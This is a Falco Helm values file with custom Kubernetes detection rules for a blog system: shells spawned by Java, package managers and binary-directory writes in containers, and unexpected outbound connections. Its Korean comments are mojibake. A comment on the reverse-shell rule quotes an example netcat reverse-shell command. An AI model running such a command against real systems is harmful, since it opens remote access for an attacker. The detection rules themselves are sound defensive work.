# ==============================================================================
# Falco Values (IDS Mode with IPS Integration)
# ==============================================================================
# ëª©ì : eBPF ê¸°ë°˜ ëŸ°íƒ€ì„ ë³´ì•ˆ ëª¨ë‹ˆí„°ë§ + IPS ì—°ë™
#
# êµ¬ì„±:
# - Falco: eBPF ê¸°ë°˜ syscall ëª¨ë‹ˆí„°ë§
# - Falcosidekick: Alert ë¼ìš°íŒ… (Loki + Talon)
# - Falcosidekick UI: ì›¹ ëŒ€ì‹œë³´ë“œ
# - Talon ì—°ë™: IPS ìë™ ëŒ€ì‘ (ë³„ë„ ì„¤ì¹˜)

# ==============================================================================
# Collector ì„¤ì •
# ==============================================================================
collectors:
  containerEngine:
    kind: auto

# ==============================================================================
# Custom Rules (blog-system íŠ¹í™”)
# ==============================================================================
customRules:
  blog-rules.yaml: |
    # ==================================================================
    # Rule 1: Java Process Spawning Shell (RCE ë°©ì–´) - CRITICAL
    # ==================================================================
    # ëª©ì : Spring Boot(Java) í”„ë¡œì„¸ìŠ¤ê°€ shellì„ ì‹¤í–‰í•˜ë©´ RCE ê³µê²© ì˜ì‹¬
    # ì˜ˆì‹œ: Log4Shell, Spring4Shell ê°™ì€ ì·¨ì•½ì  ì•…ìš©
    # ì •ìƒ ì‹œë‚˜ë¦¬ì˜¤: Javaê°€ shellì„ ì‹¤í–‰í•  ì´ìœ  ì—†ìŒ (0%)
    - rule: Java Process Spawning Shell
      desc: Detect java process spawning a shell (Likely RCE attack like Log4Shell)
      condition: >
        spawned_process and
        proc.pname exists and
        proc.pname in (java, javac) and
        proc.name in (bash, sh, ksh, zsh, dash) and
        container
      output: >
        ğŸš¨ CRITICAL: Java í”„ë¡œì„¸ìŠ¤ê°€ Shellì„ ì‹¤í–‰í–ˆìŠµë‹ˆë‹¤ (RCE ê³µê²© ì˜ì‹¬!)
          (user=%user.name pod=%k8s.pod.name namespace=%k8s.ns.name
           parent=%proc.pname cmd=%proc.cmdline container=%container.name)
      priority: CRITICAL
      tags: [maturity_stable, host, container, process, mitre_execution, T1059, rce, java]

    # ==================================================================
    # Rule 2: Package Manager in Container (Immutability ìœ„ë°˜) - WARNING
    # ==================================================================
    # ëª©ì : ìš´ì˜ ì¤‘ ì»¨í…Œì´ë„ˆì—ì„œ íŒ¨í‚¤ì§€ ì„¤ì¹˜ ê°ì§€ (ë¶ˆë³€ì„± ì›ì¹™ ìœ„ë°˜)
    # ì •ìƒ ì‹œë‚˜ë¦¬ì˜¤: ë¹Œë“œ ì‹œì—ë§Œ íŒ¨í‚¤ì§€ ì„¤ì¹˜, ëŸ°íƒ€ì„ì—” ì ˆëŒ€ ì•ˆ í•¨
    # ì•…ì˜ì  ì‹œë‚˜ë¦¬ì˜¤: í•´ì»¤ê°€ ê³µê²© ë„êµ¬ ì„¤ì¹˜ (netcat, nmap ë“±)
    - rule: Launch Package Management Process in Container
      desc: Package management process ran inside container (Immutability violation)
      condition: >
        spawned_process and
        container and
        proc.name in (apk, apt, apt-get, yum, rpm, dnf, pip, pip3, npm) and
        not proc.pname in (package_mgmt_binaries)
      output: >
        âš ï¸ WARNING: ì»¨í…Œì´ë„ˆ ë‚´ë¶€ì—ì„œ íŒ¨í‚¤ì§€ ê´€ë¦¬ìê°€ ì‹¤í–‰ë˜ì—ˆìŠµë‹ˆë‹¤!
          (user=%user.name pod=%k8s.pod.name namespace=%k8s.ns.name
           cmd=%proc.cmdline container=%container.name)
      priority: WARNING
      tags: [maturity_stable, container, process, mitre_execution, T1059]

    # ==================================================================
    # Rule 3: Write to Binary Directory (Drift Detection) - ERROR
    # ==================================================================
    # ëª©ì : ì‹œìŠ¤í…œ ë””ë ‰í† ë¦¬ì— íŒŒì¼ ì“°ê¸° ì‹œë„ ê°ì§€ (ì•…ì„±ì½”ë“œ ì„¤ì¹˜)
    # ì •ìƒ ì‹œë‚˜ë¦¬ì˜¤: /bin, /usr/bin, /sbinì€ ì½ê¸° ì „ìš©
    # ì•…ì˜ì  ì‹œë‚˜ë¦¬ì˜¤: ë°±ë„ì–´ ë°”ì´ë„ˆë¦¬ ì„¤ì¹˜, rootkit ì„¤ì¹˜
    - rule: Write to Binary Dir
      desc: Attempt to write to system binary directories
      condition: >
        open_write and
        container and
        (fd.name startswith /bin/ or
         fd.name startswith /usr/bin/ or
         fd.name startswith /sbin/ or
         fd.name startswith /usr/sbin/)
      output: >
        ğŸ”´ ERROR: ë°”ì´ë„ˆë¦¬ ë””ë ‰í† ë¦¬ì— ì“°ê¸° ì‹œë„ ê°ì§€!
        (user=%user.name file=%fd.name pod=%k8s.pod.name
         namespace=%k8s.ns.name cmd=%proc.cmdline container=%container.name)
      priority: ERROR
      tags: [maturity_stable, container, filesystem, mitre_persistence, T1543]

    # ==================================================================
    # Rule 4: Unexpected Outbound Connection (Reverse Shell ë°©ì–´) - NOTICE
    # ==================================================================
    # ëª©ì : ì˜ˆìƒì¹˜ ëª»í•œ ì™¸ë¶€ ì—°ê²° ê°ì§€ (C&C ì„œë²„ í†µì‹ , ë°ì´í„° ìœ ì¶œ)
    # ì£¼ì˜: ë…¸ì´ì¦ˆê°€ ë§ì„ ìˆ˜ ìˆìœ¼ë‹ˆ ì´ˆê¸°ì—” NOTICEë¡œ ì„¤ì •, íŠœë‹ í•„ìš”
    # ì •ìƒ ì‹œë‚˜ë¦¬ì˜¤: DB(3306), ë‚´ë¶€ API(8080), HTTPS(443) ì—°ê²°
    # ì•…ì˜ì  ì‹œë‚˜ë¦¬ì˜¤: í•´ì»¤ C&C ì„œë²„ë¡œ ì—­ì‰˜ ì—°ê²° (nc -e /bin/sh 1.2.3.4 4444)
    - rule: Unexpected Outbound Connection
      desc: Detect outbound connections to uncommon ports (potential C&C or reverse shell)
      condition: >
        outbound and
        container and
        fd.type in (ipv4, ipv6) and
        not fd.lport in (80, 443, 8080, 3306, 53) and
        not fd.sip in ("127.0.0.1", "::1") and
        not proc.name in (curl, wget, git)
      output: >
        ğŸ”µ NOTICE: ì˜ˆìƒì¹˜ ëª»í•œ ì™¸ë¶€ ì—°ê²° ì‹œë„ ê°ì§€
        (connection=%fd.name lport=%fd.lport rport=%fd.rport
         pod=%k8s.pod.name namespace=%k8s.ns.name
         cmd=%proc.cmdline container=%container.name)
      priority: NOTICE
      tags: [maturity_incubating, container, network, mitre_exfiltration, T1041]

# ==============================================================================
# Driver ì„¤ì •
# ==============================================================================
driver:
  kind: modern_ebpf

# ==============================================================================
# Falco ì„¤ì •
# ==============================================================================
falco:
  grpc:
    bind_address: unix:///run/falco/falco.sock
    enabled: true
    threadiness: 0
  grpc_output:
    enabled: true
  http_output:
    enabled: true
    insecure: true
    url: http://falco-falcosidekick:2801/
  json_include_output_property: true
  json_output: true
  log_level: info
  priority: info

# ==============================================================================
# Falcosidekick ì„¤ì • (Alert ë¼ìš°íŒ…)
# ==============================================================================
falcosidekick:
  enabled: true
  config:
    # Loki (ë¡œê·¸ ì €ì¥)
    loki:
      hostport: http://loki-stack.monitoring.svc.cluster.local:3100
      minimumpriority: warning

    # Talon (IPS ìë™ ëŒ€ì‘) - â­ ì¶”ê°€ë¨
    talon:
      address: http://falco-talon.falco.svc.cluster.local:2803
      minimumpriority: warning

  resources:
    limits:
      cpu: 100m
      memory: 128Mi
    requests:
      cpu: 20m
      memory: 64Mi

  # Falcosidekick UI
  webui:
    enabled: true
    replicaCount: 1
    resources:
      limits:
        cpu: 100m
        memory: 128Mi
      requests:
        cpu: 20m
        memory: 64Mi

# ==============================================================================
# Security Context
# ==============================================================================
podSecurityContext: {}

# ==============================================================================
# Resources
# ==============================================================================
resources:
  limits:
    cpu: 500m
    memory: 512Mi
  requests:
    cpu: 100m
    memory: 256Mi

# ==============================================================================
# ServiceAccount
# ==============================================================================
serviceAccount:
  create: true
  name: falco

# ==============================================================================
# Tolerations (Control Plane ë…¸ë“œì—ë„ ë°°í¬)
# ==============================================================================
tolerations:
- effect: NoSchedule
  key: node-role.kubernetes.io/control-plane
  operator: Exists
- effect: NoSchedule
  key: node-role.kubernetes.io/master
  operator: Exists
